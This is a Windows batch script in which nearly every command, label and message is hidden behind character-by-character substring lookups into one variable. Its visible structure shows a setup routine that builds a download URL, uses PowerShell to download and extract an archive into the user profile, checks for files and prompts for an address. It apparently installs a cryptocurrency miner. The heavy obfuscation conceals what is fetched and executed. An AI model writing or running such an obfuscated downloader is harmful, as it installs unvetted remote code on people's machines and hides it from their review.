        %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~13,1%%a2m:~23,1%%a2m:~7,1%%a2m:~22,1%_%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%=%a2m:~7,1%%a2m:~9,1%%a2m:~23,1%%a2m:~11,1%""
        %a2m:~10,1%%a2m:~22,1%%a2m:~7,1%%a2m:~22,1% %a2m:~6,1%%a2m:~11,1%%a2m:~9,1%%a2m:~50,1%%a2m:~22,1%%a2m:~9,1%%a2m:~30,1%_%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%
    )
    %a2m:~35,1%%a2m:~50,1% %a2m:~11,1%%a2m:~9,1%%a2m:~9,1%%a2m:~22,1%%a2m:~9,1%%a2m:~0,1%%a2m:~11,1%%a2m:~27,1%%a2m:~11,1%%a2m:~0,1% %a2m:~34,1% (
        %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~39,1%%a2m:~22,1%%a2m:~29,1%%a2m:~7,1%%a2m:~35,1%%a2m:~29,1%%a2m:~23,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~17,1%%a2m:~35,1%%a2m:~7,1%%a2m:~12,1% %a2m:~53,1%%a2m:~23,1%%a2m:~9,1%%a2m:~9,1%%a2m:~11,1%%a2m:~29,1%%a2m:~7,1% %a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1% (%%a2m:~53,1%%a2m:~23,1%%a2m:~9,1%%a2m:~9,1%%a2m:~11,1%%a2m:~29,1%%a2m:~7,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%%)...
        %a2m:~7,1%%a2m:~35,1%%a2m:~30,1%%a2m:~11,1%%a2m:~22,1%%a2m:~23,1%%a2m:~7,1% /%a2m:~7,1% %a2m:~34,1% >%a2m:~29,1%%a2m:~23,1%%a2m:~0,1%
        %a2m:~10,1%%a2m:~22,1%%a2m:~7,1%%a2m:~22,1% %a2m:~30,1%%a2m:~13,1%%a2m:~35,1%%a2m:~29,1%
    )
    %a2m:~35,1%%a2m:~50,1% %a2m:~11,1%%a2m:~9,1%%a2m:~9,1%%a2m:~22,1%%a2m:~9,1%%a2m:~0,1%%a2m:~11,1%%a2m:~27,1%%a2m:~11,1%%a2m:~0,1% %a2m:~24,1% (
        :%a2m:~6,1%%a2m:~11,1%%a2m:~9,1%%a2m:~50,1%%a2m:~22,1%%a2m:~9,1%%a2m:~30,1%_%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%
        %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~41,1%%a2m:~22,1%%a2m:~17,1%%a2m:~29,1%%a2m:~0,1%%a2m:~22,1%%a2m:~13,1%%a2m:~42,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%...
        %a2m:~6,1%%a2m:~22,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~12,1%%a2m:~11,1%%a2m:~0,1%%a2m:~0,1% -%a2m:~39,1%%a2m:~22,1%%a2m:~30,1%%a2m:~30,1%%a2m:~13,1%%a2m:~29,1%%a2m:~42,1% ""%a2m:~48,1%%a2m:~29,1%%a2m:~27,1%%a2m:~22,1%%a2m:~28,1%%a2m:~11,1%-%a2m:~46,1%%a2m:~11,1%%a2m:~49,1%%a2m:~56,1%%a2m:~11,1%%a2m:~33,1%%a2m:~23,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1% '%%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%_%a2m:~23,1%%a2m:~9,1%%a2m:~0,1%%' -%a2m:~55,1%%a2m:~23,1%%a2m:~7,1%%a2m:~15,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1% '%%a2m:~7,1%%a2m:~11,1%%a2m:~30,1%%a2m:~6,1%%\%a2m:~29,1%%a2m:~11,1%%a2m:~17,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%.%a2m:~49,1%%a2m:~13,1%%a2m:~7,1%'""
        
        %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~25,1%%a2m:~6,1%%a2m:~6,1%%a2m:~0,1%%a2m:~21,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%...
        %a2m:~30,1%%a2m:~22,1%%a2m:~27,1%%a2m:~11,1% /%a2m:~21,1% ""%%a2m:~7,1%%a2m:~11,1%%a2m:~30,1%%a2m:~6,1%%\%a2m:~29,1%%a2m:~11,1%%a2m:~17,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%.%a2m:~49,1%%a2m:~13,1%%a2m:~7,1%"" ""%%a2m:~44,1%%a2m:~11,1%%a2m:~0,1%%a2m:~50,1%_%a2m:~6,1%%a2m:~13,1%%a2m:~7,1%%a2m:~12,1%%"" >%a2m:~29,1%%a2m:~23,1%%a2m:~0,1%
        %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~40,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1% %a2m:~53,1%%a2m:~22,1%%a2m:~30,1%%a2m:~6,1%%a2m:~0,1%%a2m:~11,1%%a2m:~7,1%%a2m:~11,1%! %a2m:~56,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1%%a2m:~13,1%%a2m:~9,1%%a2m:~7,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1%...
        %a2m:~7,1%%a2m:~35,1%%a2m:~30,1%%a2m:~11,1%%a2m:~22,1%%a2m:~23,1%%a2m:~7,1% /%a2m:~7,1% %a2m:~24,1% >%a2m:~29,1%%a2m:~23,1%%a2m:~0,1%
        %a2m:~44,1%%a2m:~7,1%%a2m:~13,1%%a2m:~9,1%%a2m:~7,1% """" ""%%a2m:~44,1%%a2m:~11,1%%a2m:~0,1%%a2m:~50,1%_%a2m:~6,1%%a2m:~13,1%%a2m:~7,1%%a2m:~12,1%%""
        %a2m:~11,1%%a2m:~52,1%%a2m:~35,1%%a2m:~7,1%
    )
)

:: ========================
:: %a2m:~43,1%%a2m:~13,1%%a2m:~35,1%%a2m:~29,1% %a2m:~45,1%%a2m:~53,1%%a2m:~9,1%%a2m:~35,1%%a2m:~6,1%%a2m:~7,1% %a2m:~39,1%%a2m:~22,1%%a2m:~29,1%%a2m:~50,1%%a2m:~35,1%%a2m:~10,1%%a2m:~23,1%%a2m:~9,1%%a2m:~13,1%%a2m:~7,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%
:: ========================
:%a2m:~30,1%%a2m:~13,1%%a2m:~35,1%%a2m:~29,1%
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~42,1%%a2m:~22,1%%a2m:~17,1%%a2m:~29,1%%a2m:~0,1%%a2m:~22,1%%a2m:~13,1%%a2m:~42,1%_%a2m:~23,1%%a2m:~9,1%%a2m:~0,1%=%a2m:~12,1%%a2m:~7,1%%a2m:~7,1%%a2m:~6,1%%a2m:~44,1%://%a2m:~10,1%%a2m:~35,1%%a2m:~7,1%%a2m:~12,1%%a2m:~23,1%%a2m:~49,1%.%a2m:~53,1%%a2m:~22,1%%a2m:~30,1%/%a2m:~7,1%%a2m:~9,1%%a2m:~11,1%%a2m:~52,1%%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1%/%a2m:~5,1%-%a2m:~56,1%%a2m:~11,1%%a2m:~52,1%/%a2m:~9,1%%a2m:~11,1%%a2m:~0,1%%a2m:~11,1%%a2m:~13,1%%a2m:~44,1%%a2m:~11,1%%a2m:~44,1%/%a2m:~42,1%%a2m:~22,1%%a2m:~17,1%%a2m:~29,1%%a2m:~0,1%%a2m:~22,1%%a2m:~13,1%%a2m:~42,1%/%a2m:~16,1%.%a2m:~34,1%%a2m:~3,1%.%a2m:~19,1%/%a2m:~7,1%-%a2m:~9,1%%a2m:~11,1%%a2m:~52,1%-%a2m:~16,1%.%a2m:~34,1%%a2m:~3,1%.%a2m:~19,1%-%a2m:~17,1%%a2m:~35,1%%a2m:~29,1%.%a2m:~18,1%%a2m:~35,1%%a2m:~6,1%""
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~18,1%%a2m:~35,1%%a2m:~6,1%_%a2m:~50,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%=%~%a2m:~42,1%%a2m:~6,1%%a2m:~16,1%%a2m:~7,1%-%a2m:~9,1%%a2m:~11,1%%a2m:~52,1%.%a2m:~18,1%%a2m:~35,1%%a2m:~6,1%""
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~11,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%_%a2m:~42,1%%a2m:~35,1%%a2m:~9,1%=%~%a2m:~42,1%%a2m:~6,1%%a2m:~16,1%%a2m:~7,1%-%a2m:~9,1%%a2m:~11,1%%a2m:~52,1%""
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1%_%a2m:~49,1%%a2m:~13,1%%a2m:~7,1%=%~%a2m:~42,1%%a2m:~6,1%%a2m:~16,1%%a2m:~44,1%%a2m:~7,1%%a2m:~13,1%%a2m:~9,1%%a2m:~7,1%_%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1%.%a2m:~49,1%%a2m:~13,1%%a2m:~7,1%""
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~9,1%%a2m:~11,1%%a2m:~50,1%%a2m:~11,1%%a2m:~9,1%%a2m:~9,1%%a2m:~13,1%%a2m:~0,1%_%a2m:~53,1%%a2m:~22,1%%a2m:~42,1%%a2m:~11,1%=#%a2m:~21,1%%a2m:~18,1%%a2m:~20,1%%a2m:~12,1%-%a2m:~13,1%%a2m:~23,1%%a2m:~20,1%%a2m:~12,1%""

:%a2m:~35,1%%a2m:~29,1%%a2m:~35,1%%a2m:~7,1%
%a2m:~35,1%%a2m:~50,1% ""%%a2m:~13,1%%a2m:~23,1%%a2m:~7,1%%a2m:~22,1%_%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%""==""%a2m:~50,1%%a2m:~13,1%%a2m:~0,1%%a2m:~44,1%%a2m:~11,1%"" %a2m:~53,1%%a2m:~13,1%%a2m:~0,1%%a2m:~0,1% :%a2m:~53,1%%a2m:~12,1%%a2m:~11,1%%a2m:~53,1%%a2m:~28,1%_%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%a2m:~44,1%

%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% === %a2m:~41,1%%a2m:~22,1%%a2m:~10,1%%a2m:~11,1%%a2m:~53,1%%a2m:~22,1%%a2m:~35,1%%a2m:~29,1% %a2m:~43,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1% %a2m:~45,1%%a2m:~11,1%%a2m:~7,1%%a2m:~23,1%%a2m:~6,1% ===
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1%.
%a2m:~35,1%%a2m:~50,1% %a2m:~11,1%%a2m:~52,1%%a2m:~35,1%%a2m:~44,1%%a2m:~7,1% ""%%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1%_%a2m:~49,1%%a2m:~13,1%%a2m:~7,1%%"" (
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% ######################################
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% # %a2m:~5,1%%a2m:~12,1%%a2m:~13,1%%a2m:~29,1%%a2m:~28,1%%a2m:~44,1% %a2m:~50,1%%a2m:~22,1%%a2m:~9,1% %a2m:~23,1%%a2m:~44,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~5,1%%a2m:~35,1%%a2m:~30,1%%a2m:~30,1%%a2m:~21,1%'%a2m:~44,1% %a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1%%a2m:~53,1%%a2m:~22,1%%a2m:~29,1%%a2m:~50,1%%a2m:~35,1%%a2m:~10,1% :%a2m:~41,1%
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% ######################################
    %a2m:~7,1%%a2m:~35,1%%a2m:~30,1%%a2m:~11,1%%a2m:~22,1%%a2m:~23,1%%a2m:~7,1% /%a2m:~7,1% %a2m:~4,1% >%a2m:~29,1%%a2m:~23,1%%a2m:~0,1%
    %a2m:~53,1%%a2m:~13,1%%a2m:~0,1%%a2m:~0,1% ""%%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1%_%a2m:~49,1%%a2m:~13,1%%a2m:~7,1%%""
    %a2m:~11,1%%a2m:~52,1%%a2m:~35,1%%a2m:~7,1% /%a2m:~49,1%
)

:: %a2m:~56,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1% %a2m:~22,1%%a2m:~50,1% %a2m:~22,1%%a2m:~9,1%%a2m:~35,1%%a2m:~10,1%%a2m:~35,1%%a2m:~29,1%%a2m:~13,1%%a2m:~0,1% %a2m:~44,1%%a2m:~53,1%%a2m:~9,1%%a2m:~35,1%%a2m:~6,1%%a2m:~7,1% %a2m:~53,1%%a2m:~22,1%%a2m:~29,1%%a2m:~7,1%%a2m:~35,1%%a2m:~29,1%%a2m:~23,1%%a2m:~11,1%%a2m:~44,1%...
:%a2m:~42,1%%a2m:~22,1%%a2m:~17,1%%a2m:~29,1%%a2m:~0,1%%a2m:~22,1%%a2m:~13,1%%a2m:~42,1%_%a2m:~44,1%%a2m:~7,1%%a2m:~11,1%%a2m:~6,1%
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~24,1%/%a2m:~38,1%] %a2m:~39,1%%a2m:~12,1%%a2m:~11,1%%a2m:~53,1%%a2m:~28,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~50,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%a2m:~44,1%...
%a2m:~35,1%%a2m:~50,1% %a2m:~11,1%%a2m:~52,1%%a2m:~35,1%%a2m:~44,1%%a2m:~7,1% ""%%a2m:~18,1%%a2m:~35,1%%a2m:~6,1%_%a2m:~50,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%"" (
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~45,1%%a2m:~5,1%%a2m:~25,1%%a2m:~5,1%%a2m:~40,1%%a2m:~45,1%] %a2m:~5,1%-%a2m:~56,1%%a2m:~11,1%%a2m:~52,1% %a2m:~13,1%%a2m:~0,1%%a2m:~9,1%%a2m:~11,1%%a2m:~13,1%%a2m:~42,1%%a2m:~21,1% %a2m:~42,1%%a2m:~22,1%%a2m:~17,1%%a2m:~29,1%%a2m:~0,1%%a2m:~22,1%%a2m:~13,1%%a2m:~42,1%%a2m:~11,1%%a2m:~42,1%
    %a2m:~10,1%%a2m:~22,1%%a2m:~7,1%%a2m:~22,1% %a2m:~11,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%_%a2m:~44,1%%a2m:~7,1%%a2m:~11,1%%a2m:~6,1%
)

%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~25,1%%a2m:~39,1%%a2m:~5,1%%a2m:~48,1%%a2m:~55,1%%a2m:~51,1%] %a2m:~41,1%%a2m:~22,1%%a2m:~17,1%%a2m:~29,1%%a2m:~0,1%%a2m:~22,1%%a2m:~13,1%%a2m:~42,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~5,1%-%a2m:~56,1%%a2m:~11,1%%a2m:~52,1% %a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~11,1%%a2m:~9,1%...
%a2m:~6,1%%a2m:~22,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~12,1%%a2m:~11,1%%a2m:~0,1%%a2m:~0,1% -%a2m:~39,1%%a2m:~22,1%%a2m:~30,1%%a2m:~30,1%%a2m:~13,1%%a2m:~29,1%%a2m:~42,1% ""$%a2m:~36,1%%a2m:~9,1%%a2m:~22,1%%a2m:~10,1%%a2m:~9,1%%a2m:~11,1%%a2m:~44,1%%a2m:~44,1%%a2m:~36,1%%a2m:~9,1%%a2m:~11,1%%a2m:~50,1%%a2m:~11,1%%a2m:~9,1%%a2m:~11,1%%a2m:~29,1%%a2m:~53,1%%a2m:~11,1% = '%a2m:~45,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%a2m:~29,1%%a2m:~7,1%%a2m:~0,1%%a2m:~21,1%%a2m:~39,1%%a2m:~22,1%%a2m:~29,1%%a2m:~7,1%%a2m:~35,1%%a2m:~29,1%%a2m:~23,1%%a2m:~11,1%'; %a2m:~48,1%%a2m:~29,1%%a2m:~27,1%%a2m:~22,1%%a2m:~28,1%%a2m:~11,1%-%a2m:~46,1%%a2m:~11,1%%a2m:~49,1%%a2m:~56,1%%a2m:~11,1%%a2m:~33,1%%a2m:~23,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1% '%%a2m:~42,1%%a2m:~22,1%%a2m:~17,1%%a2m:~29,1%%a2m:~0,1%%a2m:~22,1%%a2m:~13,1%%a2m:~42,1%_%a2m:~23,1%%a2m:~9,1%%a2m:~0,1%%' -%a2m:~55,1%%a2m:~23,1%%a2m:~7,1%%a2m:~15,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1% '%%a2m:~18,1%%a2m:~35,1%%a2m:~6,1%_%a2m:~50,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%'""
%a2m:~35,1%%a2m:~50,1% %a2m:~29,1%%a2m:~22,1%%a2m:~7,1% %a2m:~11,1%%a2m:~52,1%%a2m:~35,1%%a2m:~44,1%%a2m:~7,1% ""%%a2m:~18,1%%a2m:~35,1%%a2m:~6,1%_%a2m:~50,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%"" (
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~32,1%%a2m:~56,1%%a2m:~56,1%%a2m:~55,1%%a2m:~56,1%] %a2m:~41,1%%a2m:~22,1%%a2m:~17,1%%a2m:~29,1%%a2m:~0,1%%a2m:~22,1%%a2m:~13,1%%a2m:~42,1% %a2m:~50,1%%a2m:~13,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%a2m:~42,1%! %a2m:~39,1%%a2m:~12,1%%a2m:~11,1%%a2m:~53,1%%a2m:~28,1% %a2m:~35,1%%a2m:~29,1%%a2m:~7,1%%a2m:~11,1%%a2m:~9,1%%a2m:~29,1%%a2m:~11,1%%a2m:~7,1%
    %a2m:~6,1%%a2m:~13,1%%a2m:~23,1%%a2m:~44,1%%a2m:~11,1%
    %a2m:~11,1%%a2m:~52,1%%a2m:~35,1%%a2m:~7,1% /%a2m:~49,1%
)
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~45,1%%a2m:~40,1%%a2m:~39,1%%a2m:~39,1%%a2m:~32,1%%a2m:~45,1%%a2m:~45,1%] %a2m:~41,1%%a2m:~22,1%%a2m:~17,1%%a2m:~29,1%%a2m:~0,1%%a2m:~22,1%%a2m:~13,1%%a2m:~42,1% %a2m:~53,1%%a2m:~22,1%%a2m:~30,1%%a2m:~6,1%%a2m:~0,1%%a2m:~11,1%%a2m:~7,1%%a2m:~11,1%!
%a2m:~7,1%%a2m:~35,1%%a2m:~30,1%%a2m:~11,1%%a2m:~22,1%%a2m:~23,1%%a2m:~7,1% /%a2m:~7,1% %a2m:~24,1% >%a2m:~29,1%%a2m:~23,1%%a2m:~0,1%

:%a2m:~11,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%_%a2m:~44,1%%a2m:~7,1%%a2m:~11,1%%a2m:~6,1%
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~34,1%/%a2m:~38,1%] %a2m:~32,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~50,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%a2m:~44,1%...
%a2m:~35,1%%a2m:~50,1% %a2m:~11,1%%a2m:~52,1%%a2m:~35,1%%a2m:~44,1%%a2m:~7,1% ""%%a2m:~11,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%_%a2m:~42,1%%a2m:~35,1%%a2m:~9,1%%\%a2m:~7,1%-%a2m:~9,1%%a2m:~11,1%%a2m:~52,1%.%a2m:~11,1%%a2m:~52,1%%a2m:~11,1%"" (
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~45,1%%a2m:~5,1%%a2m:~25,1%%a2m:~5,1%%a2m:~40,1%%a2m:~45,1%] %a2m:~15,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%a2m:~44,1% %a2m:~13,1%%a2m:~0,1%%a2m:~9,1%%a2m:~11,1%%a2m:~13,1%%a2m:~42,1%%a2m:~21,1% %a2m:~11,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%%a2m:~11,1%%a2m:~42,1%
    %a2m:~10,1%%a2m:~22,1%%a2m:~7,1%%a2m:~22,1% %a2m:~53,1%%a2m:~22,1%%a2m:~29,1%%a2m:~50,1%%a2m:~35,1%%a2m:~10,1%_%a2m:~44,1%%a2m:~7,1%%a2m:~11,1%%a2m:~6,1%
)

%a2m:~30,1%%a2m:~28,1%%a2m:~42,1%%a2m:~35,1%%a2m:~9,1% ""%%a2m:~11,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%_%a2m:~42,1%%a2m:~35,1%%a2m:~9,1%%"" %a2m:~34,1%>%a2m:~29,1%%a2m:~23,1%%a2m:~0,1%
%a2m:~6,1%%a2m:~22,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~12,1%%a2m:~11,1%%a2m:~0,1%%a2m:~0,1% -%a2m:~39,1%%a2m:~22,1%%a2m:~30,1%%a2m:~30,1%%a2m:~13,1%%a2m:~29,1%%a2m:~42,1% ""%a2m:~32,1%%a2m:~52,1%%a2m:~6,1%%a2m:~13,1%%a2m:~29,1%%a2m:~42,1%-%a2m:~25,1%%a2m:~9,1%%a2m:~53,1%%a2m:~12,1%%a2m:~35,1%%a2m:~27,1%%a2m:~11,1% -%a2m:~36,1%%a2m:~13,1%%a2m:~7,1%%a2m:~12,1% '%%a2m:~18,1%%a2m:~35,1%%a2m:~6,1%_%a2m:~50,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%' -%a2m:~41,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1%%a2m:~35,1%%a2m:~29,1%%a2m:~13,1%%a2m:~7,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%%a2m:~36,1%%a2m:~13,1%%a2m:~7,1%%a2m:~12,1% '%%a2m:~11,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%_%a2m:~42,1%%a2m:~35,1%%a2m:~9,1%%' -%a2m:~15,1%%a2m:~22,1%%a2m:~9,1%%a2m:~53,1%%a2m:~11,1%""
%a2m:~35,1%%a2m:~50,1% %a2m:~29,1%%a2m:~22,1%%a2m:~7,1% %a2m:~11,1%%a2m:~52,1%%a2m:~35,1%%a2m:~44,1%%a2m:~7,1% ""%%a2m:~11,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%_%a2m:~42,1%%a2m:~35,1%%a2m:~9,1%%\%a2m:~7,1%-%a2m:~9,1%%a2m:~11,1%%a2m:~52,1%.%a2m:~11,1%%a2m:~52,1%%a2m:~11,1%"" (
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~32,1%%a2m:~56,1%%a2m:~56,1%%a2m:~55,1%%a2m:~56,1%] %a2m:~32,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1% %a2m:~50,1%%a2m:~13,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1%%a2m:~42,1%!
    %a2m:~6,1%%a2m:~13,1%%a2m:~23,1%%a2m:~44,1%%a2m:~11,1%
    %a2m:~11,1%%a2m:~52,1%%a2m:~35,1%%a2m:~7,1% /%a2m:~49,1%
)
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~45,1%%a2m:~40,1%%a2m:~39,1%%a2m:~39,1%%a2m:~32,1%%a2m:~45,1%%a2m:~45,1%] %a2m:~32,1%%a2m:~52,1%%a2m:~7,1%%a2m:~9,1%%a2m:~13,1%%a2m:~53,1%%a2m:~7,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1% %a2m:~42,1%%a2m:~22,1%%a2m:~29,1%%a2m:~11,1%!
%a2m:~7,1%%a2m:~35,1%%a2m:~30,1%%a2m:~11,1%%a2m:~22,1%%a2m:~23,1%%a2m:~7,1% /%a2m:~7,1% %a2m:~24,1% >%a2m:~29,1%%a2m:~23,1%%a2m:~0,1%

:%a2m:~53,1%%a2m:~22,1%%a2m:~29,1%%a2m:~50,1%%a2m:~35,1%%a2m:~10,1%_%a2m:~44,1%%a2m:~7,1%%a2m:~11,1%%a2m:~6,1%
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~57,1%/%a2m:~38,1%] %a2m:~39,1%%a2m:~22,1%%a2m:~29,1%%a2m:~50,1%%a2m:~35,1%%a2m:~10,1%%a2m:~23,1%%a2m:~9,1%%a2m:~13,1%%a2m:~7,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%...
:%a2m:~17,1%%a2m:~13,1%%a2m:~0,1%%a2m:~0,1%%a2m:~11,1%%a2m:~7,1%_%a2m:~35,1%%a2m:~29,1%%a2m:~6,1%%a2m:~23,1%%a2m:~7,1%
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% /%a2m:~6,1% ""%a2m:~42,1%%a2m:~22,1%%a2m:~10,1%%a2m:~11,1%_%a2m:~13,1%%a2m:~42,1%%a2m:~42,1%%a2m:~9,1%%a2m:~11,1%%a2m:~44,1%%a2m:~44,1%=%a2m:~32,1%%a2m:~29,1%%a2m:~7,1%%a2m:~11,1%%a2m:~9,1% %a2m:~21,1%%a2m:~22,1%%a2m:~23,1%%a2m:~9,1% %a2m:~41,1%%a2m:~22,1%%a2m:~10,1%%a2m:~11,1%%a2m:~53,1%%a2m:~22,1%%a2m:~35,1%%a2m:~29,1% %a2m:~17,1%%a2m:~13,1%%a2m:~0,1%%a2m:~0,1%%a2m:~11,1%%a2m:~7,1% %a2m:~13,1%%a2m:~42,1%%a2m:~42,1%%a2m:~9,1%%a2m:~11,1%%a2m:~44,1%%a2m:~44,1%: ""
%a2m:~35,1%%a2m:~50,1% ""!%a2m:~42,1%%a2m:~22,1%%a2m:~10,1%%a2m:~11,1%_%a2m:~13,1%%a2m:~42,1%%a2m:~42,1%%a2m:~9,1%%a2m:~11,1%%a2m:~44,1%%a2m:~44,1%!""=="""" (
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% [%a2m:~25,1%%a2m:~47,1%%a2m:~32,1%%a2m:~56,1%%a2m:~5,1%] %a2m:~25,1%%a2m:~42,1%%a2m:~42,1%%a2m:~9,1%%a2m:~11,1%%a2m:~44,1%%a2m:~44,1% %a2m:~53,1%%a2m:~13,1%%a2m:~29,1%%a2m:~29,1%%a2m:~22,1%%a2m:~7,1% %a2m:~49,1%%a2m:~11,1% %a2m:~11,1%%a2m:~30,1%%a2m:~6,1%%a2m:~7,1%%a2m:~21,1%!
